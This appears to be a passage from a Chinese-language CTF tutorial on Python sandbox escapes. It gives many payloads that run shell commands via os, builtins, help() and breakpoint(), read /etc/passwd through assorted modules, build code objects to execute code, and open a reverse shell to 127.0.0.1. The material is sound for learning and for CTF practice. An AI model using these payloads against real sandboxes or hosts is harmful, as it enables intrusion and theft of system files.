<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
<p>eval 无法直接达到执行多行代码的效果，使用 compile 函数并传入 exec 模式就能够实现。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(compile(&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;))</span><br></pre></td></tr></table></figure>

<p>platform</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import platform</span><br><span class="line">platform.sys.modules[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br><span class="line">platform.os.system(&#x27;ls&#x27;)</span><br><span class="line">print platform.popen(&#x27;dir&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>importlib</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line"># Python3可以，Python2没有该函数</span><br><span class="line">importlib.__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<p>sys</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&#x27;os&#x27;].system(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>

<p>linecache</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import linecache</span><br><span class="line">linecache.os.system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<p>__builtins__<br>__builtins__： 是一个 builtins 模块的一个引用，其中包含 Python 的内置名称。这个模块自动在所有模块的全局命名空间中导入。当然我们也可以使用 import builtins 来导入<br>它包含许多基本函数（如 print、len 等）和基本类（如 object、int、list 等）。这就是可以在 Python 脚本中直接使用 print、len 等函数，而无需导入任何模块的原因。<br>我们可以使用 dir() 查看当前模块的属性列表. 其中就可以看到 __builtins__<br>内置的函数中 open 与文件操作相关，（python2 中为 file 函数）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.open(&#x27;/etc/passwd&#x27;).read()</span><br><span class="line">__import__(&quot;builtins&quot;).open(&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>__builtins__除了读取文件之外还可以通过调用其 __import__ 属性来引入别的模块执行命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__.__import__</span><br><span class="line">&lt;built-in function __import__&gt;</span><br><span class="line">&gt;&gt;&gt; __builtins__.__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<p>由于每个导入的模块都会留存一个 __builtins__ 属性，因此我们可以在任意的模块中通过__builtins__来引入模块或者执行文件操作。需要注意的是，__builtins__在模块级别和全局级别的表现有所不同。</p>
<p>在全局级别（也就是你在Python交互式解释器中直接查看__builtins__时），__builtins__实际上是一个模块&lt;module ‘__builtin__’ (built-in)&gt;。</p>
<p>在模块级别（也就是你在一个Python脚本中查看__builtins__），__builtins__是一个字典，这个字典包含了__builtin__模块中所有的函数和类。</p>
<p>因此，当通过其他模块的 __builtins__时，如__import__(‘types’).__builtins__时，实际上看到的是一个字典，包含了所有的内建函数和类。此时调用的方式有所变化。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __import__(&#x27;types&#x27;).__builtins__[&#x27;__import__&#x27;]</span><br><span class="line">&lt;built-in function __import__&gt;</span><br></pre></td></tr></table></figure>

<p>很多时候我们要获取 builtins，获取 builtins 方法多样，需要结合已有的条件加以分析，如果存在内置函数，则可以通过 __self__ 快速获取 builtins 模块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print.__self__</span><br><span class="line">print.__self__.exec</span><br></pre></td></tr></table></figure>

<p>help函数<br>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh<br>以下面的环境为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</span><br></pre></td></tr></table></figure>

<p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help()</span><br></pre></td></tr></table></figure>
<p>然后输入 os,此时会进入 os 的帮助文档。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help&gt; os</span><br></pre></td></tr></table></figure>
<p>然后在输入 !sh 就可以拿到 &#x2F;bin&#x2F;sh, 输入 !bash 则可以拿到 &#x2F;bin&#x2F;bash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">help&gt; os</span><br><span class="line">$ ls</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>

<p>breakpoint 函数<br>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="line">(Pdb) __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">0</span><br><span class="line">(Pdb) __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br></pre></td></tr></table></figure>


<p>反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">s=__import__(&#x27;socket&#x27;).socket(__import__(&#x27;socket&#x27;).AF_INET,__import__(&#x27;socket&#x27;).SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,12345));[__import__(&#x27;os&#x27;).dup2(s.fileno(),i) for i in range(3)];__import__(&#x27;pty&#x27;).spawn(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>

<p>其他</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bdb：bdb.os、cgi.sys</span><br><span class="line">cgi：cgi.os、cgi.sys</span><br></pre></td></tr></table></figure>

<p>构造代码对象进行RCE</p>
<p>CodeType 是 python 的内置类型之一，用于表示编译后的字节码对象。CodeType 对象包含了函数、方法或模块的字节码指令序列以及与之相关的属性。</p>
<p>CodeType 对象具有以下属性：</p>
<p>co_argcount: 函数的参数数量，不包括可变参数和关键字参数。<br>co_cellvars: 函数内部使用的闭包变量的名称列表。<br>co_code: 函数的字节码指令序列，以二进制形式表示。<br>co_consts: 函数中使用的常量的元组，包括整数、浮点数、字符串等。<br>co_exceptiontable: 异常处理表，用于描述函数中的异常处理。<br>co_filename: 函数所在的文件名。<br>co_firstlineno: 函数定义的第一行所在的行号。<br>co_flags: 函数的标志位，表示函数的属性和特征，如是否有默认参数、是否是生成器函数等。<br>co_freevars: 函数中使用的自由变量的名称列表，自由变量是在函数外部定义但在函数内部被引用的变量。<br>co_kwonlyargcount: 函数的关键字参数数量。<br>co_lines: 函数的源代码行列表。<br>co_linetable: 函数的行号和字节码指令索引之间的映射表。<br>co_lnotab: 表示行号和字节码指令索引之间的映射关系的字符串。<br>co_name: 函数的名称。<br>co_names: 函数中使用的全局变量的名称列表。<br>co_nlocals: 函数中局部变量的数量。<br>co_positions: 函数中与位置相关的变量（比如闭包中的自由变量）的名称列表。<br>co_posonlyargcount: 函数的仅位置参数数量。<br>co_qualname: 函数的限定名称，包含了函数所在的模块和类名。<br>co_stacksize: 函数的堆栈大小，表示函数执行时所需的堆栈空间。<br>co_varnames: 函数中局部变量的名称列表。</p>
<p>假设存在如下的一个函数.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def get_flag(some_input):</span><br><span class="line">    var1=1</span><br><span class="line">    var2=&quot;secretcode&quot;</span><br><span class="line">    var3=[&quot;some&quot;,&quot;array&quot;]</span><br><span class="line">    def calc_flag(flag_rot2):</span><br><span class="line">        return &#x27;&#x27;.join(chr(ord(c)-2) for c in flag_rot2)</span><br><span class="line">    if some_input == var2:</span><br><span class="line">        return calc_flag(&quot;VjkuKuVjgHnci&quot;)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;Nope&quot;</span><br></pre></td></tr></table></figure>

<p>我们可以通过 get_flag.__code__ 获取其代码对象. 代码对象包含了关于代码的所有信息, 例如 co_code 属性存储了字节码信息, 因此修改这个字节码就可以达到修改函数执行的目的, 但需要注意的是，python 可以将某个函数的 __code__ 对象整个进行修改。仅仅修改其中的子属性是不行的。如下所示, python 会抛出异常.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; get_flag.__code__.co_code</span><br><span class="line">b&#x27;\x97\x00d\x01&#125;\x01d\x02&#125;\x02d\x03d\x04g\x02&#125;\x03d\x05\x84\x00&#125;\x04|\x00|\x02k\x02\x00\x00\x00\x00r\x0b\x02\x00|\x04d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00d\x07S\x00&#x27;</span><br><span class="line">&gt;&gt;&gt; get_flag.__code__.co_code = 1</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: attribute &#x27;co_code&#x27; of &#x27;code&#x27; objects is not writable</span><br></pre></td></tr></table></figure>

<p>这种情况下,我们需要构造一个新的代码对象并主动执行.具体步骤如下：<br>1.第一步，本地构造 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def read():</span><br><span class="line">    return print(open(&quot;/etc/passwd&quot;,&#x27;r&#x27;).read())</span><br></pre></td></tr></table></figure>
<p>2.获取创建代码对象所需的参数, 通过 help 或者 __doc__ 属性进行获取, 不同的版本有所差异， 我在本地测试时版本为 python 3.11.2，此时 code 需要传入 17 个参数，且不支持关键字传递。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&gt; import types</span><br><span class="line">&gt;&gt;&gt; help(types.CodeType)</span><br><span class="line">code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars=(), cellvars=(), /)</span><br></pre></td></tr></table></figure>
<p>3.参数赋值。获取到所需的参数之后，我们可以将这些参数先保存在变量中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">code = read.__code__</span><br><span class="line">  </span><br><span class="line">argcount = code.co_argcount</span><br><span class="line">posonlyargcount = code.co_posonlyargcount</span><br><span class="line">kwonlyargcount = code.co_kwonlyargcount</span><br><span class="line">nlocals = code.co_nlocals</span><br><span class="line">stacksize = code.co_stacksize</span><br><span class="line">flags = code.co_flags</span><br><span class="line">codestring = code.co_code</span><br><span class="line">constants = code.co_consts</span><br><span class="line">names = code.co_names</span><br><span class="line">varnames = code.co_varnames</span><br><span class="line">filename = code.co_filename</span><br><span class="line">name = code.co_name</span><br><span class="line">qualname = code.co_qualname</span><br><span class="line">firstlineno = code.co_firstlineno</span><br><span class="line">linetable = code.co_linetable</span><br><span class="line">exceptiontable = code.co_exceptiontable</span><br><span class="line">freevars = code.co_freevars</span><br><span class="line">cellvars = code.co_cellvars</span><br></pre></td></tr></table></figure>
<p>4.创建代码对象。创建代码对象需要调用 types.CodeType。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import types</span><br><span class="line">codeobj = types.CodeType(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars, cellvars)</span><br></pre></td></tr></table></figure>
<p>也可以使用 builtins 中的 type 函数获取到这个类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code_type = type((lambda: None).__code__)</span><br></pre></td></tr></table></figure>
<p>5.调用函数。从代码对象进行调用需要创建一个函数对象, 获取这个类可以使用 type 函数，或者直接 import</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function_type = type(lambda: None)</span><br></pre></td></tr></table></figure>
<p>创建函数对象所需的参数如下，可以通过 help 函数查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function(code, globals, name=None, argdefs=None, closure=None)</span><br></pre></td></tr></table></figure>
<p>一般情况下只需要前两个参数即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mydict = &#123;&#125;</span><br><span class="line">mydict[&#x27;__builtins__&#x27;] = __builtins__</span><br><span class="line">function_type(codeobj, mydict, None, None, None)()</span><br></pre></td></tr></table></figure>
<p>6.调用函数也可以直接使用 eval 或者 exec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(codeobj)</span><br></pre></td></tr></table></figure>

<p>完整代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">def read():</span><br><span class="line">        return print(open(&quot;/etc/passwd&quot;,&#x27;r&#x27;).read())</span><br><span class="line"></span><br><span class="line">function_type = type(lambda: None)</span><br><span class="line">code_type = type((lambda: None).__code__)</span><br><span class="line"></span><br><span class="line">code = read.__code__</span><br><span class="line"></span><br><span class="line">argcount = code.co_argcount</span><br><span class="line">posonlyargcount = code.co_posonlyargcount</span><br><span class="line">kwonlyargcount = code.co_kwonlyargcount</span><br><span class="line">nlocals = code.co_nlocals</span><br><span class="line">stacksize = code.co_stacksize</span><br><span class="line">flags = code.co_flags</span><br><span class="line">codestring = code.co_code</span><br><span class="line">constants = code.co_consts</span><br><span class="line">names = code.co_names</span><br><span class="line">varnames = code.co_varnames</span><br><span class="line">filename = code.co_filename</span><br><span class="line">name = code.co_name</span><br><span class="line">qualname = code.co_qualname</span><br><span class="line">firstlineno = code.co_firstlineno</span><br><span class="line">linetable = code.co_linetable</span><br><span class="line">exceptiontable = code.co_exceptiontable</span><br><span class="line">freevars = code.co_freevars</span><br><span class="line">cellvars = code.co_cellvars</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mydict = &#123;&#125;</span><br><span class="line">mydict[&#x27;__builtins__&#x27;] = __builtins__</span><br><span class="line"></span><br><span class="line">codeobj = code_type(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars, cellvars)</span><br><span class="line"># code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars=(), cellvars=(),/)</span><br><span class="line"></span><br><span class="line"># function_type(codeobj, mydict, None, None, None)()</span><br><span class="line">eval(codeobj)</span><br></pre></td></tr></table></figure>
<p>最终可以成功读取 &#x2F;etc&#x2F;passwd</p>
<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>file 类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Python2 </span><br><span class="line">file(&#x27;test.txt&#x27;).read()</span><br><span class="line">#注意：该函数只存在于Python2，Python3不存在</span><br></pre></td></tr></table></figure>

<p>open 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/etc/passwd&#x27;).read()</span><br><span class="line">__builtins__.open(&#x27;/etc/passwd&#x27;).read()</span><br><span class="line">__import__(&quot;builtins&quot;).open(&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>get_data 函数<br>FileLoader 类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># _frozen_importlib_external.FileLoader.get_data(0,&lt;filename&gt;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[91].get_data(0,&quot;app.py&quot;)</span><br></pre></td></tr></table></figure>
<p>相比于获取 __builtins__再使用 open 去进行读取,使用 get_data 的 payload 更短</p>
<p>codecs模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">codecs.open(&#x27;test.txt&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>linecache 模块<br>getlines 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import linecache</span><br><span class="line">&gt;&gt;&gt; linecache.getlines(&#x27;/etc/passwd&#x27;)</span><br><span class="line">&gt;&gt;&gt; __import__(&quot;linecache&quot;).getlines(&#x27;/etc/passwd&#x27;)</span><br></pre></td></tr></table></figure>

<p>getline 函数需要第二个参数指定行号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;linecache&quot;).getline(&#x27;/etc/passwd&#x27;,1)</span><br></pre></td></tr></table></figure>

<p>license 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]</span><br><span class="line">a = __builtins__.help</span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]</span><br><span class="line">a.__class__.__exit__ = lambda self, *args: None</span><br><span class="line">with (a as b):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<h3 id="枚举目录"><a href="#枚举目录" class="headerlink" title="枚举目录"></a>枚举目录</h3><p>os 模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.listdir(&quot;/&quot;)</span><br><span class="line"></span><br><span class="line">__import__(&#x27;os&#x27;).listdir(&#x27;/&#x27;)</span><br></pre></td></tr></table></figure>

<p>glob模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import glob</span><br><span class="line">glob.glob(&quot;f*&quot;)</span><br><span class="line"></span><br><span class="line">__import__(&#x27;glob&#x27;).glob(&quot;f*&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="获取函数信息"><a href="#获取函数信息" class="headerlink" title="获取函数信息"></a>获取函数信息</h3><p>python 中的每一个函数对象都有一个 __code__属性.这个__code__属性就是上面的代码对象，存放了大量有关于该函数的信息。</p>
<p>假设上下文存在一个函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def get_flag(some_input):</span><br><span class="line">    var1=1</span><br><span class="line">    var2=&quot;secretcode&quot;</span><br><span class="line">    var3=[&quot;some&quot;,&quot;array&quot;]</span><br><span class="line">    if some_input == var2:</span><br><span class="line">        return &quot;THIS-IS-THE-FALG!&quot;</span><br><span class="line">    else:</span><br><span class="line">        return &quot;Nope&quot;</span><br></pre></td></tr></table></figure>

<p>__code__属性包含了诸多子属性,这些子属性用于描述函数的字节码对象,下面是对这些属性的解释：</p>
<p>co_argcount: 函数的参数数量，不包括可变参数和关键字参数。</p>
<p>co_cellvars: 函数内部使用的闭包变量的名称列表。</p>
<p>co_code: 函数的字节码指令序列，以二进制形式表示。</p>
<p>co_consts: 函数中使用的常量的元组，包括整数、浮点数、字符串等。</p>
<p>co_exceptiontable: 异常处理表，用于描述函数中的异常处理。</p>
<p>co_filename: 函数所在的文件名。</p>
<p>co_firstlineno: 函数定义的第一行所在的行号。</p>
<p>co_flags: 函数的标志位，表示函数的属性和特征，如是否有默认参数、是否是生成器函数等。</p>
<p>co_freevars: 函数中使用的自由变量的名称列表，自由变量是在函数外部定义但在函数内部被引用的变量。</p>
<p>co_kwonlyargcount: 函数的关键字参数数量。</p>
<p>co_lines: 函数的源代码行列表。</p>
<p>co_linetable: 函数的行号和字节码指令索引之间的映射表。</p>
<p>co_lnotab: 表示行号和字节码指令索引之间的映射关系的字符串。</p>
<p>co_name: 函数的名称。</p>
<p>co_names: 函数中使用的全局变量的名称列表。</p>
<p>co_nlocals: 函数中局部变量的数量。</p>
<p>co_positions: 函数中与位置相关的变量（比如闭包中的自由变量）的名称列表。</p>
<p>co_posonlyargcount: 函数的仅位置参数数量。</p>
<p>co_qualname: 函数的限定名称，包含了函数所在的模块和类名。</p>
<p>co_stacksize: 函数的堆栈大小，表示函数执行时所需的堆栈空间。</p>
<p>co_varnames: 函数中局部变量的名称列表。</p>
<p>获取函数中的常量<br>可以使用 __code__.co_consts这种方法获取常量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; get_flag.__code__.co_consts</span><br><span class="line">(None, 1, &#x27;secretcode&#x27;, &#x27;some&#x27;, &#x27;array&#x27;, &#x27;THIS-IS-THE-FALG!&#x27;, &#x27;Nope&#x27;)</span><br></pre></td></tr></table></figure>

<p>获取变量名称<br>则可以使用如下的 payload 获取 get_flag 函数中的变量信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__globals__</span><br><span class="line"></span><br><span class="line">get_flag.__globals__</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; get_flag.__code__.co_varnames</span><br><span class="line">(&#x27;some_input&#x27;, &#x27;var1&#x27;, &#x27;var2&#x27;, &#x27;var3&#x27;)</span><br></pre></td></tr></table></figure>

<p>获取函数字节码序列<br>get_flag 函数的 __code__.co_code, 可以获取到函数的字节码序列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; get_flag.__code__.co_code</span><br><span class="line">b&#x27;\x97\x00d\x01&#125;\x01d\x02&#125;\x02d\x03d\x04g\x02&#125;\x03|\x00|\x02k\x02\x00\x00\x00\x00r\x02d\x05S\x00d\x06S\x00&#x27;</span><br></pre></td></tr></table></figure>

<p>字节码并不包含源代码的完整信息，如变量名、注释等。但可以使用 dis 模块来反汇编字节码并获取大致的源代码.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bytecode = get_flag.__code__.co_code</span><br><span class="line">&gt;&gt;&gt; dis.dis(bytecode)</span><br><span class="line">          0 RESUME                   0</span><br><span class="line">          2 LOAD_CONST               1</span><br><span class="line">          4 STORE_FAST               1</span><br><span class="line">          6 LOAD_CONST               2</span><br><span class="line">          8 STORE_FAST               2</span><br><span class="line">         10 LOAD_CONST               3</span><br><span class="line">         12 LOAD_CONST               4</span><br><span class="line">         14 BUILD_LIST               2</span><br><span class="line">         16 STORE_FAST               3</span><br><span class="line">         18 LOAD_FAST                0</span><br><span class="line">         20 LOAD_FAST                2</span><br><span class="line">         22 COMPARE_OP               2 (==)</span><br><span class="line">         28 POP_JUMP_FORWARD_IF_FALSE     2 (to 34)</span><br><span class="line">         30 LOAD_CONST               5</span><br><span class="line">         32 RETURN_VALUE</span><br><span class="line">    &gt;&gt;   34 LOAD_CONST               6</span><br><span class="line">         36 RETURN_VALUE</span><br></pre></td></tr></table></figure>

<p>虽然能获取但不太方便看,如果能够获取 __code__对象,也可以通过 dis.disassemble 获取更清晰的表示.</p>
